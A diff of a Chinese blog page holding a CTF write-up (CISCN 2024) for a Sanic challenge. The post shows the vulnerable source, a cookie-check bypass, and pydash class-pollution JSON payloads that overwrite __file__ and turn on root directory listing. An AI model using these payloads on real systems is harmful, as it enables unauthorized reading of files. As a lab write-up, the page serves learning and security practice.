@@ -8,12 +8,12 @@
     <meta name="google-site-verification" content="FVeTimbT1kTEtyy7CZnjl87tv6Zu3gYnjspaqbsrZ6M" />
     <meta name="baidu-site-verification" content="codeva-4fIoJmJzzi" />
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
-    <meta name="description" content="sanic 先看源码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647from sanic import Sanicfrom sanic.response import text, htmlfrom sanic_session import Sessionimport pyda">
+    <meta name="description" content="sanic先看源码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647from sanic import Sanicfrom sanic.response import text, htmlfrom sanic_session import Sessionimport pydas">
 <meta property="og:type" content="article">
 <meta property="og:title" content="ciscn2024复现">
 <meta property="og:url" content="https://oceanzbz.github.io/post/3b6915e3.html">
 <meta property="og:site_name" content="Oceanzbz&#39;s Blog">
-<meta property="og:description" content="sanic 先看源码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647from sanic import Sanicfrom sanic.response import text, htmlfrom sanic_session import Sessionimport pyda">
+<meta property="og:description" content="sanic先看源码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647from sanic import Sanicfrom sanic.response import text, htmlfrom sanic_session import Sessionimport pydas">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://oceanzbz.github.io/post/3b6915e3/IMAGE20250228172711690.png">
 <meta property="og:image" content="https://oceanzbz.github.io/post/3b6915e3/IMAGE20250228173709994.png">
@@ -202,26 +202,31 @@
   
 
   <div class="content e-content" itemprop="articleBody">
-    <h2 id="sanic">sanic</h2>
-<p>先看源码</p>
+    <h2 id="sanic"><a href="#sanic" class="headerlink" title="sanic"></a>sanic</h2><p>先看源码</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sanic <span class="keyword">import</span> Sanic</span><br><span class="line"><span class="keyword">from</span> sanic.response <span class="keyword">import</span> text, html</span><br><span class="line"><span class="keyword">from</span> sanic_session <span class="keyword">import</span> Session</span><br><span class="line"><span class="keyword">import</span> pydash</span><br><span class="line"><span class="comment"># pydash==5.1.2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Pollute</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">app = Sanic(__name__)</span><br><span class="line">app.static(<span class="string">&quot;/static/&quot;</span>, <span class="string">&quot;./static/&quot;</span>)</span><br><span class="line">Session(app)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">index</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> html(<span class="built_in">open</span>(<span class="string">&#x27;static/index.html&#x27;</span>).read())</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/login&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">request</span>):</span><br><span class="line">    user = request.cookies.get(<span class="string">&quot;user&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> user.lower() == <span class="string">&#x27;adm;n&#x27;</span>:</span><br><span class="line">        request.ctx.session[<span class="string">&#x27;admin&#x27;</span>] = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;login success&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> text(<span class="string">&quot;login fail&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/src&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">src</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> text(<span class="built_in">open</span>(__file__).read())</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/admin&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">admin</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">if</span> request.ctx.session.get(<span class="string">&#x27;admin&#x27;</span>) == <span class="literal">True</span>:</span><br><span class="line">        key = request.json[<span class="string">&#x27;key&#x27;</span>]</span><br><span class="line">        value = request.json[<span class="string">&#x27;value&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> key <span class="keyword">and</span> value <span class="keyword">and</span> <span class="built_in">type</span>(key) <span class="keyword">is</span> <span class="built_in">str</span> <span class="keyword">and</span> <span class="string">&#x27;_.&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> key:</span><br><span class="line">            pollute = Pollute()</span><br><span class="line">            pydash.set_(pollute, key, value)</span><br><span class="line">            <span class="keyword">return</span> text(<span class="string">&quot;success&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> text(<span class="string">&quot;forbidden&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> text(<span class="string">&quot;forbidden&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+
 <img src="/post/3b6915e3/IMAGE20250228172711690.png" class="">
+
 <p>可以看到登录是根据cookie的参数进行判断，但是这里有一个;如果我们传入;会截断，所以使用八进制编码绕过即可。</p>
 <img src="/post/3b6915e3/IMAGE20250228173709994.png" class="">
-<p>admin路由可以直接污染，但是存在waf <code>_.</code>使用<code>\\\\</code> 可以绕过。接下来就是污染__file__属性值了<br>
-因为在src路由里有一个读文件的操作。</p>
+<p>admin路由可以直接污染，但是存在waf <code>_.</code>使用<code>\\\\</code> 可以绕过。接下来就是污染__file__属性值了<br>因为在src路由里有一个读文件的操作。</p>
 <img src="/post/3b6915e3/IMAGE20250228173829761.png" class="">
 <img src="/post/3b6915e3/IMAGE20250228173940256.png" class="">
 <p>污染成功，所以现在要做的就是要找到flag的文件名，这也就是这题的考点如何利用污染列目录。</p>
 <p>来看static这个函数</p>
 <img src="/post/3b6915e3/IMAGE20250228174123917.png" class="">
+
 <p>这里的directory_view和directory_handler属性需要关注一下因为解释中说的是</p>
 <img src="/post/3b6915e3/IMAGE20250228174202765.png" class="">
+
 <p>大概意思就是directory_view为True时，会开启列目录功能，directory_handler中可以获取指定的目录。跟进directory_handler看看</p>
 <img src="/post/3b6915e3/IMAGE20250228174455369.png" class="">
+
 <p>他调用的是DirectoryHandler这个类</p>
 <img src="/post/3b6915e3/IMAGE20250228174355761.png" class="">
-<p>所以如果能够污染 directory为 /  directory_view为True就可以列根目录了</p>
+
+<p>所以如果能够污染 directory为 &#x2F;  directory_view为True就可以列根目录了</p>
 <p>通过查看别的师傅的文章，发现可以通过app.router.name_index[‘xxxxx’]来获取注册的路由，该写下源码调试看看</p>
 <img src="/post/3b6915e3/IMAGE20250228175821707.png" class="">
 <p>可以看到已经有注册的路由，那怎么找到DirectoryHandler他呢。全局搜一下name_index</p>
@@ -231,21 +236,28 @@
 <p>可以看到需要的两个变量。所以可以污染了</p>
 <p>directory_view</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;key&quot;</span>:<span class="string">&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory_view&quot;</span>,<span class="string">&quot;value&quot;</span>: <span class="literal">True</span>&#125;</span><br></pre></td></tr></table></figure>
+
 <p>directory</p>
 <p>这里不能直接污染因为他不是字符串类型</p>
 <img src="/post/3b6915e3/IMAGE20250228180640161.png" class="">
+
 <p>在原来的地方看一下</p>
 <img src="/post/3b6915e3/IMAGE20250228180731036.png" class="">
+
 <p>是一个path对象跟进看看</p>
 <img src="/post/3b6915e3/IMAGE20250228180933887.png" class="">
+
 <p>最后是给了_parts，看一下这个属性</p>
 <img src="/post/3b6915e3/IMAGE20250228181227467.png" class="">
+
 <p>是列表类型，直接污染</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;key&quot;</span>:<span class="string">&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory._parts&quot;</span>,<span class="string">&quot;value&quot;</span>: [<span class="string">&quot;/&quot;</span>]&#125;</span><br></pre></td></tr></table></figure>
+
 <img src="/post/3b6915e3/IMAGE20250228175037662.png" class="">
 <p>最后在污染 <code>__file__</code>  变量就可以了</p>
 <p>汇总</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#开启列目录功能</span></span><br><span class="line">&#123;<span class="string">&quot;key&quot;</span>:<span class="string">&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory_view&quot;</span>,<span class="string">&quot;value&quot;</span>: true&#125;</span><br><span class="line"><span class="comment">#将目录设置在根目录下&#123;&quot;key&quot;:&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory._parts&quot;,&quot;value&quot;: [&quot;/&quot;]&#125;</span></span><br></pre></td></tr></table></figure>
+
 <p>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/gxngxngxn/p/18205235">https://www.cnblogs.com/gxngxngxn/p/18205235</a></p>
 
   </div>
